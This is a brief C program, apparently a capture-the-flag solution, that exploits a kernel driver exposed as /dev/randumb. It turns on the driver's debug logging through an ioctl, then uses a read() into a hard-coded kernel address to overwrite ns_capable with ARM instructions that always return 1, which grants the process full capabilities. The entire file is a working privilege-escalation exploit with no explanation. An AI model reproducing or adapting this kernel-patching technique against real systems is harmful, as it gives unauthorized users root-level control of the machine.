#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>

#define DEBUG_FILE		"/tmp/randumb.log"
#define IOCTL_GET_SETTINGS 	-0xff
#define IOCTL_SET_SETTINGS 	-0x100
// #define O_RDWR   		0x02
// #define O_CREAT  		0x40

char patch[] = "\x01\x00\xa0\xe3\x1e\xff\x2f\xe1";

struct settings {
        int charset;
        int debug;
        int debug_time;
        int debug_uid;
};

void main(void){
	int fd, fdp;
	void *ns_capable = (void*)0x800297c8;
	struct settings s = {
		.charset = 0,
		.debug = 1,
		.debug_time = 0,
		.debug_uid = 0,
	};

	mkdir(DEBUG_FILE, 0);

	fd = open("/dev/randumb", 0, 0);
	ioctl(fd, IOCTL_SET_SETTINGS, &s);

	fdp = open("/tmp/patch", O_RDWR|O_CREAT, 0644);

	write(fdp, patch, sizeof(patch));
	lseek(fdp, SEEK_SET, 0);
	read(fdp, ns_capable, sizeof(patch));
}
